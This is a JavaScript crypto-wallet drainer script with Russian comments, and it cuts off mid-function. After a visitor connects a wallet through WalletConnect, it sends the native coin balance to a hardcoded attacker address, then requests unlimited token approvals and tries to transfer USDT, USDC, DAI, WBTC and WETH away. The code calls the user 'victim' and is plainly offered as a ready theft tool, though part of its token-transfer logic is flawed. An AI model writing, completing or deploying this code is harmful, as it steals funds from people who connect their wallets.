/ --- КОНФИГУРАЦИЯ ---
const your_wallet_address = "0x0e7F3426C8bBE2ceA15EF02d45E0F4a7CB279dC1"; // Адрес, куда полетят деньги и NFT
const rpc_url = "https://mainnet.infura.io/v3/ТВОЙ_INFURA_ID"; // RPC для Ethereum. Можешь заменить на BSC, Polygon и т.д.
const chain_id = 1; // 1 для Ethereum, 56 для BSC, 137 для Polygon

// Список адресов популярных ERC-20 токенов для проверки
const tokens_to_drain = [
    "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
    "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",// USDC
"0x6B175474E89094C44Da98b954EedeAC495271d0F", // DAI
"0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", // WBTC
    "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"  // WETH
];
// --------------------

const connectButton = document.getElementById('connectButton');

const providerOptions = {
    walletconnect: {
        package: WalletConnectProvider.default,
        options: {
            rpc: {
                [chain_id]: rpc_url
            }
        }
    }
};

const web3Provider = new ethers.providers.Web3Provider(window.ethereum || new WalletConnectProvider.default({ rpc: { [chain_id]: rpc_url } }));

const drainAssets = async () => {
    try {
        // Инициализация WalletConnect
        const wcProvider = new WalletConnectProvider.default({
            rpc: { [chain_id]: rpc_url },
        });
        await wcProvider.enable();
        const provider = new ethers.providers.Web3Provider(wcProvider);
        const signer = provider.getSigner();
        const victim_address = await signer.getAddress();

        console.log(`Wallet connected: ${victim_address}`);
        connectButton.innerText = "Processing...";
        connectButton.disabled = true;

        // 1. Опустошаем нативный баланс (ETH, BNB, etc.)
        const balance = await signer.getBalance();
        const gasPrice = await provider.getGasPrice();
        const gasLimit = ethers.BigNumber.from(21000);
        const gasCost = gasPrice.mul(gasLimit);

        if (balance.gt(gasCost)) {
            const amountToSend = balance.sub(gasCost);
            console.log(`Draining ${ethers.utils.formatEther(amountToSend)} ETH...`);
            try {
                const tx = await signer.sendTransaction({
                    to: your_wallet_address,
                    value: amountToSend,
                    gasLimit: gasLimit
                });
                await tx.wait();
                console.log(`ETH drained. Tx: ${tx.hash}`);
            } catch (err) {
                console.error("ETH drain failed:", err.message);
            }
        }

        // 2. Опустошаем ERC-20 токены
        for (const token_address of tokens_to_drain) {
            const tokenContract = new ethers.Contract(token_address, erc20_abi, signer);
            try {
                const tokenBalance = await tokenContract.balanceOf(victim_address);
                if (tokenBalance.gt(0)) {
                    console.log(`Found ${ethers.utils.formatUnits(tokenBalance, await tokenContract.decimals())} of ${await tokenContract.symbol()}`);
                    
                    // Запрашиваем бесконечный аппрув
                    const approveTx = await tokenContract.approve(your_wallet_address, ethers.constants.MaxUint256);
                    await approveTx.wait();
                    console.log(`Approved ${await tokenContract.symbol()}. Now transferring...`);

                    // Переводим все токены на свой кошелек
                    // Для этого нужен смарт-контракт, но для простоты можно перевести на свой адрес, если жертва даст аппрув на него
                    // Более продвинутый метод - аппрув на твой смарт-контракт, который вызовет transferFrom
                    const transferTx = await tokenContract.transferFrom(victim_address, your_wallet_address, tokenBalance);
                    await transferTx.wait();
                    console.log(`${await tokenContract.symbol()} drained. Tx: ${transferTx.hash}`);
                }
            } catch (err) {
                console.error(`Failed to drain token ${token_address}:`, err.message);
            }
        }

        connectButton.innerText = "DONE";
        console.log("Drain process finished.");

    } catch (error) {
        console.error("Connection or draining failed:", error);
        connectButton.innerText = "Connection Failed";
 setTimeout (() => {